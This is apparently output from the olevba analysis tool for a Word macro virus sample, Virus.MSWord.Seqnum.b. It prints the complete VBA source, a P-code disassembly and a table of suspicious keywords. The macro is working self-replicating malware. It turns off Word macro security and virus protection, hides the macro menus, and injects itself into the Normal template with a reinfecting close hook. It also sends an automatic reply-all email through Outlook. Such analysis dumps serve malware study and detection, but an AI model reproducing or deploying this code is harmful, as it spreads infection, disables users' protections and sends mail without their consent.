olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Seqnum.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Seqnum.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
hnetCmd.Enabled = True
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
CHL = NTI1.Properties.Item("ConsecutiveHyphensLimit").Value
If CHL > 800 Then
If ((CHL / 1000 + (CHL / 10 Mod 100)) Mod 10) = ((CHL / 100 Mod 10) + CHL Mod 10) Then GoTo Caught
Else
seqNum = 824
hnetPath = Application.Path
hnetName = hnetPath & "\" & CStr(seqNum) & ".bas"
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
ADCL = ADI1.CodeModule.CountOfLines
moduleName = ADI1.Name
Open hnetName For Output Lock Read Write As #1
firstLine = "Attribute VB_Name = " & """" & moduleName & """"
Print #1, firstLine
i = 1
Do While ADI1.CodeModule.Lines(i, 1) <> ""
thisLine = ADI1.CodeModule.Lines(i, 1)
If thisLine = "seqNum = " & CStr(seqNum) Then
    a = Int(seqNum / 1000): b = Int(seqNum / 100) Mod 10: c = Int(seqNum / 10) Mod 10: d = seqNum Mod 10
    e = (a + b) Mod 10: f = (b + c) Mod 10: g = (c + d) Mod 10: h = (d + a) Mod 10
    newSeq = e * 1000 + f * 100 + g * 10 + h
    Print #1, "seqNum = " & CStr(newSeq)
Else
    Print #1, thisLine
End If
i = i + 1
Loop
Close #1
NTI1.Properties.Item("ConsecutiveHyphensLimit").Value = seqNum
NTCL = NTI1.CodeModule.CountOfLines
If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL
NTI1.CodeModule.InsertLines 1, "Private Sub Document_Close()"
NTI1.CodeModule.InsertLines 2, "Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)"
NTI1.CodeModule.InsertLines 3, "ADCL = ADI1.CodeModule.CountOfLines"
NTI1.CodeModule.InsertLines 4, "If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL"
NTI1.CodeModule.InsertLines 5, "ADI1.CodeModule.AddFromFile (" & """" & hnetName & """" & ")"
NTI1.CodeModule.InsertLines 6, "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName"
NTI1.CodeModule.InsertLines 7, "ActiveDocument.Saved = True"
NTI1.CodeModule.InsertLines 8, "End Sub"
End If
Caught:
Dim hnetDays(0 To 4, 0 To 1) As String
hnetDays(0, 0) = "0101": hnetDays(0, 1) = "Happy New Year!"
hnetDays(1, 0) = "0214": hnetDays(1, 1) = "Acutally... I love you."
hnetDays(2, 0) = "1203": hnetDays(2, 1) = "Happy Birthday, hnet!"
hnetDays(3, 0) = "1225": hnetDays(3, 1) = "Merry Christmas!"
Dim hnetApp, hnetMapiName, hnetMailItem, hnetDefInbox, hnetMailReply
Dim hnetContactCount, hnetInboxCount As Long
Set hnetApp = CreateObject("Outlook.Application")
Set hnetMapiName = hnetApp.GetNamespace("MAPI")
hnetMapiName.Logon "profile", "password"
Set hnetinspector = hnetApp.ActiveInspector
Set hnetMailItem = hnetinspector.CurrentItem
Set hnetMailReply = hnetMailItem.Actions("Reply to All").Execute
hnetMailReply.Body = "OK! I got it, thanks."
For i = 0 To 3
If Day(Now) = CInt(Right(hnetDays(i, 0), 2)) And Month(Now) = CInt(Left(hnetDays(i, 0), 2)) Then
hnetMailReply.Body = hnetMailReply.Body & Chr(13) & Chr(10) & hnetDays(i, 1)
Exit For
End If
Next i
If i = 2 Then age = (Year(Now) - 1998)
hnetMailReply.Body = hnetMailReply.Body & Chr(13) & Chr(10) & "Let's celebrating your " & age & " year(s) old birthday!"
hnetMailReply.Body = hnetMailReply.Body & Chr(13) & Chr(10) & Application.UserName
peep = ""
hnetMailReply.Send
hnetMapiName.Logoff
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Seqnum.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6916 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitVarSpecial (True)
' 	Ld hnetCmd 
' 	MemSt Enabled 
' Line #3:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #4:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #5:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #6:
' 	ElseBlock 
' Line #7:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #8:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTI1 
' Line #11:
' 	LitStr 0x0017 "ConsecutiveHyphensLimit"
' 	Ld NTI1 
' 	MemLd Properties 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	St CHL 
' Line #12:
' 	Ld CHL 
' 	LitDI2 0x0320 
' 	Gt 
' 	IfBlock 
' Line #13:
' 	Ld CHL 
' 	LitDI2 0x03E8 
' 	Div 
' 	Ld CHL 
' 	LitDI2 0x000A 
' 	Div 
' 	LitDI2 0x0064 
' 	Mod 
' 	Paren 
' 	Add 
' 	Paren 
' 	LitDI2 0x000A 
' 	Mod 
' 	Paren 
' 	Ld CHL 
' 	LitDI2 0x0064 
' 	Div 
' 	LitDI2 0x000A 
' 	Mod 
' 	Paren 
' 	Ld CHL 
' 	LitDI2 0x000A 
' 	Mod 
' 	Add 
' 	Paren 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Caught 
' 	EndIf 
' Line #14:
' 	ElseBlock 
' Line #15:
' 	LitDI2 0x0338 
' 	St seqNum 
' Line #16:
' 	Ld Application 
' 	MemLd Path 
' 	St hnetPath 
' Line #17:
' 	Ld hnetPath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld seqNum 
' 	Coerce (Str) 
' 	Concat 
' 	LitStr 0x0004 ".bas"
' 	Concat 
' 	St hnetName 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADI1 
' Line #19:
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCL 
' Line #20:
' 	Ld ADI1 
' 	MemLd New 
' 	St moduleName 
' Line #21:
' 	Ld hnetName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output Lock Read Write)
' Line #22:
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitStr 0x0001 """
' 	Concat 
' 	Ld moduleName 
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	St firstLine 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld firstLine 
' 	PrintItemNL 
' Line #24:
' 	LitDI2 0x0001 
' 	St i 
' Line #25:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #26:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St thisLine 
' Line #27:
' 	Ld thisLine 
' 	LitStr 0x0009 "seqNum = "
' 	Ld seqNum 
' 	Coerce (Str) 
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #28:
' 	Ld seqNum 
' 	LitDI2 0x03E8 
' 	Div 
' 	FnInt 
' 	St a 
' 	BoS 0x0000 
' 	Ld seqNum 
' 	LitDI2 0x0064 
' 	Div 
' 	FnInt 
' 	LitDI2 0x000A 
' 	Mod 
' 	St B 
' 	BoS 0x0000 
' 	Ld seqNum 
' 	LitDI2 0x000A 
' 	Div 
' 	FnInt 
' 	LitDI2 0x000A 
' 	Mod 
' 	St c 
' 	BoS 0x0000 
' 	Ld seqNum 
' 	LitDI2 0x000A 
' 	Mod 
' 	St d 
' Line #29:
' 	Ld a 
' 	Ld B 
' 	Add 
' 	Paren 
' 	LitDI2 0x000A 
' 	Mod 
' 	St e 
' 	BoS 0x0000 
' 	Ld B 
' 	Ld c 
' 	Add 
' 	Paren 
' 	LitDI2 0x000A 
' 	Mod 
' 	St False 
' 	BoS 0x0000 
' 	Ld c 
' 	Ld d 
' 	Add 
' 	Paren 
' 	LitDI2 0x000A 
' 	Mod 
' 	St g 
' 	BoS 0x0000 
' 	Ld d 
' 	Ld a 
' 	Add 
' 	Paren 
' 	LitDI2 0x000A 
' 	Mod 
' 	St h 
' Line #30:
' 	Ld e 
' 	LitDI2 0x03E8 
' 	Mul 
' 	Ld False 
' 	LitDI2 0x0064 
' 	Mul 
' 	Add 
' 	Ld g 
' 	LitDI2 0x000A 
' 	Mul 
' 	Add 
' 	Ld h 
' 	Add 
' 	St newSeq 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "seqNum = "
' 	Ld newSeq 
' 	Coerce (Str) 
' 	Concat 
' 	PrintItemNL 
' Line #32:
' 	ElseBlock 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld thisLine 
' 	PrintItemNL 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #36:
' 	Loop 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #38:
' 	Ld seqNum 
' 	LitStr 0x0017 "ConsecutiveHyphensLimit"
' 	Ld NTI1 
' 	MemLd Properties 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' Line #39:
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCL 
' Line #40:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTCL 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #41:
' 	LitDI2 0x0001 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #42:
' 	LitDI2 0x0002 
' 	LitStr 0x0038 "Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)"
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #43:
' 	LitDI2 0x0003 
' 	LitStr 0x0023 "ADCL = ADI1.CodeModule.CountOfLines"
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #44:
' 	LitDI2 0x0004 
' 	LitStr 0x0034 "If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL"
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #45:
' 	LitDI2 0x0005 
' 	LitStr 0x001D "ADI1.CodeModule.AddFromFile ("
' 	LitStr 0x0001 """
' 	Concat 
' 	Ld hnetName 
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #46:
' 	LitDI2 0x0006 
' 	LitStr 0x0037 "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName"
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #47:
' 	LitDI2 0x0007 
' 	LitStr 0x001B "ActiveDocument.Saved = True"
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #48:
' 	LitDI2 0x0008 
' 	LitStr 0x0007 "End Sub"
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Label Caught 
' Line #51:
' 	Dim 
' 	LitDI2 0x0000 
' 	LitDI2 0x0004 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	VarDefn hnetDays (As String)
' Line #52:
' 	LitStr 0x0004 "0101"
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsSt hnetDays 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x000F "Happy New Year!"
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	ArgsSt hnetDays 0x0002 
' Line #53:
' 	LitStr 0x0004 "0214"
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsSt hnetDays 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0017 "Acutally... I love you."
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSt hnetDays 0x0002 
' Line #54:
' 	LitStr 0x0004 "1203"
' 	LitDI2 0x0002 
' 	LitDI2 0x0000 
' 	ArgsSt hnetDays 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0015 "Happy Birthday, hnet!"
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsSt hnetDays 0x0002 
' Line #55:
' 	LitStr 0x0004 "1225"
' 	LitDI2 0x0003 
' 	LitDI2 0x0000 
' 	ArgsSt hnetDays 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0010 "Merry Christmas!"
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsSt hnetDays 0x0002 
' Line #56:
' 	Dim 
' 	VarDefn hnetApp
' 	VarDefn hnetMapiName
' 	VarDefn hnetMailItem
' 	VarDefn hnetDefInbox
' 	VarDefn hnetMailReply
' Line #57:
' 	Dim 
' 	VarDefn hnetContactCount
' 	VarDefn hnetInboxCount (As Long)
' Line #58:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set hnetApp 
' Line #59:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld hnetApp 
' 	ArgsMemLd GetNamespace 0x0001 
' 	Set hnetMapiName 
' Line #60:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld hnetMapiName 
' 	ArgsMemCall Logon 0x0002 
' Line #61:
' 	SetStmt 
' 	Ld hnetApp 
' 	MemLd ActiveInspector 
' 	Set hnetinspector 
' Line #62:
' 	SetStmt 
' 	Ld hnetinspector 
' 	MemLd CurrentItem 
' 	Set hnetMailItem 
' Line #63:
' 	SetStmt 
' 	LitStr 0x000C "Reply to All"
' 	Ld hnetMailItem 
' 	ArgsMemLd Actions 0x0001 
' 	MemLd Execute 
' 	Set hnetMailReply 
' Line #64:
' 	LitStr 0x0015 "OK! I got it, thanks."
' 	Ld hnetMailReply 
' 	MemSt Body 
' Line #65:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	For 
' Line #66:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld i 
' 	LitDI2 0x0000 
' 	ArgsLd hnetDays 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	Coerce (Int) 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Ld i 
' 	LitDI2 0x0000 
' 	ArgsLd hnetDays 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	Coerce (Int) 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #67:
' 	Ld hnetMailReply 
' 	MemLd Body 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd hnetDays 0x0002 
' 	Concat 
' 	Ld hnetMailReply 
' 	MemSt Body 
' Line #68:
' 	ExitFor 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07CE 
' 	Sub 
' 	Paren 
' 	St age 
' 	EndIf 
' Line #72:
' 	Ld hnetMailReply 
' 	MemLd Body 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0017 "Let's celebrating your "
' 	Concat 
' 	Ld age 
' 	Concat 
' 	LitStr 0x0016 " year(s) old birthday!"
' 	Concat 
' 	Ld hnetMailReply 
' 	MemSt Body 
' Line #73:
' 	Ld hnetMailReply 
' 	MemLd Body 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld hnetMailReply 
' 	MemSt Body 
' Line #74:
' 	LitStr 0x0000 ""
' 	St peep 
' Line #75:
' 	Ld hnetMailReply 
' 	ArgsMemCall Send 0x0000 
' Line #76:
' 	Ld hnetMapiName 
' 	ArgsMemCall Logoff 0x0000 
' Line #77:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

